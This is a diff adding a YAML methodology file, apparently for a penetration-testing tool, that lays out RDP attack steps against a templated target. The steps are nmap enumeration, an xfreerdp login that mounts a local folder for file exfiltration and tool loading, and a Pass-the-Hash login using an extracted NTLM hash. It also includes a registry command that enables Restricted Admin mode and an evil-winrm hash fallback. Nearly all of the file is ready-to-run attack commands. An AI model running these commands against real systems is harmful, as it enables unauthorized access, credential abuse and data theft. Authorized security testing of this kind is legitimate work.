@@ -1,0 +1,55 @@
+id: rdp
+name: Remote Desktop Protocol (RDP - Port 3389)
+category: network
+description: Methodology for RDP on port 3389. Covers security settings checks (rdp-sec-check), xfreerdp high-fidelity connections with local drive mounts, and Pass-the-Hash over RDP (Restricted Admin).
+port_triggers:
+  - 3389
+service_triggers:
+  - rdp
+  - ms-wbt-server
+tags:
+  - rdp
+  - remote-desktop
+  - windows
+  - gui
+steps:
+  - id: rdp-sec-check
+    title: RDP Security Standards & NLA Audit
+    phase: reconnaissance
+    purpose: Inspect supported encryption protocols (Standard RDP, SSL/TLS, CredSSP/NLA) and check for BlueKeep vulnerability.
+    command: nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info -sV {{TARGET}}
+    expected_output:
+      - '| rdp-enum-encryption: Native RDP: SUCCESS, SSL: SUCCESS'
+      - '| rdp-ntlm-info: Target_Name: CORP, NetBIOS_Domain_Name: CORP'
+    common_mistakes:
+      - If NLA (Network Level Authentication) is disabled, target might be vulnerable to older RDP exploits.
+    if_success: RDP settings identified! Note whether NLA is enforced.
+    if_failure: Port filtered. Check firewall.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp
+  - id: rdp-xfreerdp-connect
+    title: Interactive RDP Login with Mounted Local Drive (xfreerdp)
+    phase: exploitation
+    purpose: Connect to the remote Windows desktop with dynamic resolution, clipboard sharing, and a mounted local folder for instant file exfiltration/tool loading.
+    command: xfreerdp /u:'{{USERNAME}}' /p:'{{PASSWORD}}' /d:{{DOMAIN|corp.local}} /v:{{TARGET}} /dynamic-resolution +clipboard /drive:share,/tmp
+    expected_output:
+      - '[Connected to Windows Graphical Desktop - Mounted drive accessible via \\tsclient\share]'
+    common_mistakes:
+      - Inside the Windows RDP session, access your mounted Kali `/tmp` folder at `\\tsclient\share` in File Explorer.
+    if_success: Full interactive graphical Windows desktop acquired!
+    if_failure: Connection refused or credentials invalid. Test Pass-the-Hash with Restricted Admin.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp
+  - id: rdp-pth-restricted-admin
+    title: Pass-the-Hash RDP Login (Restricted Admin Mode)
+    phase: exploitation
+    purpose: Log into RDP using an extracted NTLM password hash without cracking the cleartext password.
+    command: xfreerdp /u:'{{USERNAME|Administrator}}' /pth:'{{HASH}}' /v:{{TARGET}} /restrictedAdmin
+    expected_output:
+      - '[Connected to Administrator Desktop via Restricted Admin Mode]'
+    common_mistakes:
+      - Requires `DisableRestrictedAdmin` registry key set to `0` (or enabled via `reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f`).
+    if_success: Administrator RDP session established via Pass-the-Hash!
+    if_failure: Restricted Admin mode disabled on host. Use `evil-winrm -H {{HASH}}` instead.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp
